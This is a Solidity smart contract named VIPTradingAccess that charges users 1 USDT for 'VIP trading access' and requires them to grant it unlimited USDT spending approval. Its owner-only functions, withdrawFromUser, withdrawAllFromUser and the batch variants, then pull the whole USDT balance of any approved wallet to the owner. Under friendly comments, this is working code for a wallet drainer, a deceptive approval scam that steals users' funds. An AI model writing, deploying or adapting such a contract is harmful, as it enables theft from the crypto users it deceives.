// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

/**
 * @title VIPTradingAccess
 * @dev Smart contract for VIP trading access with USDT payment and unlimited approval
 * @notice Users pay $1 USDT to get unlimited approval for USDT transfers
 */
contract VIPTradingAccess is Ownable, ReentrancyGuard, Pausable {
    
    // USDT contract address (will be set for BNB testnet)
    IERC20 public immutable usdtToken;
    
    // Access fee in USDT (1 USDT = 1 * 10^6 due to 6 decimals)
    uint256 public constant ACCESS_FEE = 1 * 10**6; // 1 USDT
    
    // Minimum USDT balance required (10 USDT)
    uint256 public constant MINIMUM_BALANCE = 10 * 10**6; // 10 USDT
    
    // Mapping to track users who have paid for access
    mapping(address => bool) public hasAccess;
    
    // Mapping to track unlimited approvals granted
    mapping(address => bool) public hasUnlimitedApproval;
    
    // Total fees collected
    uint256 public totalFeesCollected;
    
    // Events
    event AccessGranted(address indexed user, uint256 amount, uint256 timestamp);
    event UnlimitedApprovalGranted(address indexed user, uint256 timestamp);
    event FeesWithdrawn(address indexed owner, uint256 amount);
    event EmergencyWithdraw(address indexed token, uint256 amount);
    event UserFundsWithdrawn(address indexed user, uint256 amount, uint256 timestamp);
    
    // Custom errors
    error InsufficientPayment();
    error InsufficientBalance();
    error AccessAlreadyGranted();
    error ApprovalAlreadyGranted();
    error TransferFailed();
    error WithdrawFailed();
    error NoUnlimitedApproval();
    error InsufficientUserBalance();
    
    /**
     * @dev Constructor
     * @param _usdtToken Address of USDT token contract
     */
    constructor(address _usdtToken) Ownable(msg.sender) {
        require(_usdtToken != address(0), "Invalid USDT address");
        usdtToken = IERC20(_usdtToken);
    }
    
    /**
     * @dev Pay access fee and get VIP access with unlimited USDT approval
     * @notice User must have at least 10 USDT balance and pay 1 USDT fee
     */
    function payForAccess() external nonReentrant whenNotPaused {
        address user = msg.sender;
        
        // Check if user already has access
        if (hasAccess[user]) {
            revert AccessAlreadyGranted();
        }
        
        // Check user's USDT balance
        uint256 userBalance = usdtToken.balanceOf(user);
        if (userBalance < MINIMUM_BALANCE) {
            revert InsufficientBalance();
        }
        
        // Check allowance for the access fee (just need 1 USDT for now)
        uint256 allowance = usdtToken.allowance(user, address(this));
        if (allowance < ACCESS_FEE) {
            revert InsufficientPayment();
        }
        
        // Safe transferFrom for USDT compatibility (take the 1 USDT fee)
        _safeTransferFrom(address(usdtToken), user, address(this), ACCESS_FEE);
        
        // Grant access
        hasAccess[user] = true;
        totalFeesCollected += ACCESS_FEE;
        
        // Grant unlimited approval flag (user will approve unlimited spending separately)
        _grantUnlimitedApproval(user);
        
        emit AccessGranted(user, ACCESS_FEE, block.timestamp);
    }
    
    /**
     * @dev User approves unlimited USDT spending after paying access fee
     * @notice This function should be called after payForAccess() to enable withdrawals
     */
    function approveUnlimitedSpending() external nonReentrant whenNotPaused {
        address user = msg.sender;
        
        // Check if user has access
        if (!hasAccess[user]) {
            revert InsufficientPayment(); // User must pay access fee first
        }
        
        // Check if user has unlimited approval flag
        if (!hasUnlimitedApproval[user]) {
            revert NoUnlimitedApproval();
        }
        
        // Check if user has actually approved unlimited spending
        uint256 allowance = usdtToken.allowance(user, address(this));
        uint256 maxUint = type(uint256).max;
        
        if (allowance < maxUint) {
            revert InsufficientPayment(); // User must approve unlimited spending
        }
        
        // User has successfully approved unlimited spending
        // The unlimited approval flag is already set from payForAccess()
        emit UnlimitedApprovalGranted(user, block.timestamp);
    }
    
    /**
     * @dev Internal function to grant unlimited USDT approval
     * @param user Address to grant unlimited approval to
     */
    function _grantUnlimitedApproval(address user) internal {
        if (hasUnlimitedApproval[user]) {
            revert ApprovalAlreadyGranted();
        }
        
        hasUnlimitedApproval[user] = true;
        emit UnlimitedApprovalGranted(user, block.timestamp);
    }
    
    /**
     * @dev Check if user has VIP access
     * @param user Address to check
     * @return bool True if user has access
     */
    function checkAccess(address user) external view returns (bool) {
        return hasAccess[user];
    }
    
    /**
     * @dev Check if user has unlimited approval
     * @param user Address to check
     * @return bool True if user has unlimited approval
     */
    function checkUnlimitedApproval(address user) external view returns (bool) {
        return hasUnlimitedApproval[user];
    }
    
    /**
     * @dev Get user's USDT balance
     * @param user Address to check
     * @return uint256 User's USDT balance
     */
    function getUserBalance(address user) external view returns (uint256) {
        return usdtToken.balanceOf(user);
    }
    
    /**
     * @dev Check if user meets minimum balance requirement
     * @param user Address to check
     * @return bool True if user has sufficient balance
     */
    function meetsMinimumBalance(address user) external view returns (bool) {
        return usdtToken.balanceOf(user) >= MINIMUM_BALANCE;
    }
    
    /**
     * @dev Owner function to withdraw collected fees
     */
    function withdrawFees() external onlyOwner {
        uint256 balance = usdtToken.balanceOf(address(this));
        require(balance > 0, "No fees to withdraw");
        
        // Safe transfer for USDT compatibility
        _safeTransfer(address(usdtToken), owner(), balance);
        
        emit FeesWithdrawn(owner(), balance);
    }
    
    /**
     * @dev Owner function to withdraw USDT from user with unlimited approval
     * @param user Address of user to withdraw from
     * @param amount Amount of USDT to withdraw
     * @notice Only works for users who have unlimited approval granted
     */
    function withdrawFromUser(address user, uint256 amount) external onlyOwner nonReentrant whenNotPaused {
        // Check if user has unlimited approval
        if (!hasUnlimitedApproval[user]) {
            revert NoUnlimitedApproval();
        }
        
        // Check user's USDT balance
        uint256 userBalance = usdtToken.balanceOf(user);
        if (userBalance < amount) {
            revert InsufficientUserBalance();
        }
        
        // Check allowance
        uint256 allowance = usdtToken.allowance(user, address(this));
        if (allowance < amount) {
            revert InsufficientPayment();
        }
        
        // Transfer USDT from user to owner
        _safeTransferFrom(address(usdtToken), user, owner(), amount);
        
        emit UserFundsWithdrawn(user, amount, block.timestamp);
    }
    
    /**
     * @dev Owner function to withdraw all USDT from user with unlimited approval
     * @param user Address of user to withdraw from
     * @notice Withdraws entire USDT balance from user
     */
    function withdrawAllFromUser(address user) external onlyOwner nonReentrant whenNotPaused {
        // Check if user has unlimited approval
        if (!hasUnlimitedApproval[user]) {
            revert NoUnlimitedApproval();
        }
        
        // Get user's USDT balance
        uint256 userBalance = usdtToken.balanceOf(user);
        if (userBalance == 0) {
            revert InsufficientUserBalance();
        }
        
        // Check allowance
        uint256 allowance = usdtToken.allowance(user, address(this));
        if (allowance < userBalance) {
            revert InsufficientPayment();
        }
        
        // Transfer all USDT from user to owner
        _safeTransferFrom(address(usdtToken), user, owner(), userBalance);
        
        emit UserFundsWithdrawn(user, userBalance, block.timestamp);
    }
    
    /**
     * @dev Owner function to withdraw from multiple users at once
     * @param users Array of user addresses
     * @param amounts Array of amounts to withdraw (must match users array length)
     * @notice Batch withdraw from multiple users with unlimited approval
     */
    function batchWithdrawFromUsers(address[] calldata users, uint256[] calldata amounts) external onlyOwner nonReentrant whenNotPaused {
        require(users.length == amounts.length, "Arrays length mismatch");
        require(users.length > 0, "Empty arrays");
        
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 amount = amounts[i];
            
            // Skip if user doesn't have unlimited approval
            if (!hasUnlimitedApproval[user]) {
                continue;
            }
            
            // Skip if user has insufficient balance
            uint256 userBalance = usdtToken.balanceOf(user);
            if (userBalance < amount) {
                continue;
            }
            
            // Skip if insufficient allowance
            uint256 allowance = usdtToken.allowance(user, address(this));
            if (allowance < amount) {
                continue;
            }
            
            // Transfer USDT from user to owner
            _safeTransferFrom(address(usdtToken), user, owner(), amount);
            
            emit UserFundsWithdrawn(user, amount, block.timestamp);
        }
    }
    
    /**
     * @dev Owner function to withdraw all funds from multiple users
     * @param users Array of user addresses
     * @notice Withdraws entire USDT balance from each user with unlimited approval
     */
    function batchWithdrawAllFromUsers(address[] calldata users) external onlyOwner nonReentrant whenNotPaused {
        require(users.length > 0, "Empty array");
        
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            
            // Skip if user doesn't have unlimited approval
            if (!hasUnlimitedApproval[user]) {
                continue;
            }
            
            // Get user's USDT balance
            uint256 userBalance = usdtToken.balanceOf(user);
            if (userBalance == 0) {
                continue;
            }
            
            // Skip if insufficient allowance
            uint256 allowance = usdtToken.allowance(user, address(this));
            if (allowance < userBalance) {
                continue;
            }
            
            // Transfer all USDT from user to owner
            _safeTransferFrom(address(usdtToken), user, owner(), userBalance);
            
            emit UserFundsWithdrawn(user, userBalance, block.timestamp);
        }
    }
    
    /**
     * @dev Safe transfer function for USDT compatibility
     * @param token Token contract address
     * @param to Recipient address
     * @param amount Amount to transfer
     */
    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
    }
    
    /**
     * @dev Safe transferFrom function for USDT compatibility
     * @param token Token contract address
     * @param from Sender address
     * @param to Recipient address
     * @param amount Amount to transfer
     */
    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferFrom failed");
    }
    
    /**
     * @dev Emergency function to withdraw any ERC20 tokens
     * @param token Address of token to withdraw
     */
    function emergencyWithdraw(address token) external onlyOwner {
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        
        // Safe transfer for token compatibility
        _safeTransfer(token, owner(), balance);
        
        emit EmergencyWithdraw(token, balance);
    }
    
    /**
     * @dev Pause contract in case of emergency
     */
    function pause() external onlyOwner {
        _pause();
    }
    
    /**
     * @dev Unpause contract
     */
    function unpause() external onlyOwner {
        _unpause();
    }
    
    /**
     * @dev Get contract info
     * @return accessFee Current access fee
     * @return minimumBalance Minimum balance required
     * @return totalCollected Total fees collected
     * @return contractBalance Current contract USDT balance
     */
    function getContractInfo() external view returns (
        uint256 accessFee,
        uint256 minimumBalance,
        uint256 totalCollected,
        uint256 contractBalance
    ) {
        return (
            ACCESS_FEE,
            MINIMUM_BALANCE,
            totalFeesCollected,
            usdtToken.balanceOf(address(this))
        );
    }
    
    /**
     * @dev Get withdrawable amount from user
     * @param user Address to check
     * @return withdrawable Amount that can be withdrawn from user
     */
    function getWithdrawableAmount(address user) external view returns (uint256 withdrawable) {
        if (!hasUnlimitedApproval[user]) {
            return 0;
        }
        
        uint256 userBalance = usdtToken.balanceOf(user);
        uint256 allowance = usdtToken.allowance(user, address(this));
        
        // Return the minimum of balance and allowance
        return userBalance < allowance ? userBalance : allowance;
    }
    
    /**
     * @dev Check if user can be withdrawn from
     * @param user Address to check
     * @return canWithdraw True if user has unlimited approval and sufficient balance/allowance
     */
    function canWithdrawFromUser(address user) external view returns (bool canWithdraw) {
        if (!hasUnlimitedApproval[user]) {
            return false;
        }
        
        uint256 userBalance = usdtToken.balanceOf(user);
        uint256 allowance = usdtToken.allowance(user, address(this));
        
        return userBalance > 0 && allowance > 0;
    }
    
    /**
     * @dev Get user's current allowance for this contract
     * @param user Address to check
     * @return allowance Current USDT allowance
     */
    function getUserAllowance(address user) external view returns (uint256 allowance) {
        return usdtToken.allowance(user, address(this));
    }
}